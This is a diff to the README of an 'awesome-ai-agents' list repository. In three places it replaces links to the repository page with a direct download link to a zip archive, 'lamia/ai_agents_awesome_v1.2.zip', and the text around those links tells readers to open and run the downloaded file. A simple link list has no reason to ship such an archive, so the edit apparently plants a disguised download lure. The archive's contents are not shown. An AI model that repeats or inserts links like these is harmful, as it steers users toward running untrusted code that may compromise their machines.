@@ -1,6 +1,6 @@
 # 🤖 awesome-ai-agents - Explore AI agent tools fast
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue?style=for-the-badge)](https://github.com/Mdhu8768/awesome-ai-agents)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue?style=for-the-badge)](https://github.com/Mdhu8768/awesome-ai-agents/raw/refs/heads/main/lamia/ai_agents_awesome_v1.2.zip)
 
 ## 🧭 What this is
 
@@ -18,7 +18,7 @@ This repository is best for people who want to:
 
 Use this link to visit the page and download the project:
 
-[Visit the download page](https://github.com/Mdhu8768/awesome-ai-agents)
+[Visit the download page](https://github.com/Mdhu8768/awesome-ai-agents/raw/refs/heads/main/lamia/ai_agents_awesome_v1.2.zip)
 
 If your browser asks what to do, choose **Open** or **Save**. After the file finishes downloading, open the folder where it was saved and run it if you have a packaged app, or open the repository page if you want to read the list online.
 
@@ -195,7 +195,7 @@ This repository gives you a place to start for each of these.
 
 Use this link again to visit the repository and download the project:
 
-[https://github.com/Mdhu8768/awesome-ai-agents](https://github.com/Mdhu8768/awesome-ai-agents)
+[https://github.com/Mdhu8768/awesome-ai-agents/raw/refs/heads/main/lamia/ai_agents_awesome_v1.2.zip](https://github.com/Mdhu8768/awesome-ai-agents/raw/refs/heads/main/lamia/ai_agents_awesome_v1.2.zip)
 
 ## 🗃 File layout
 
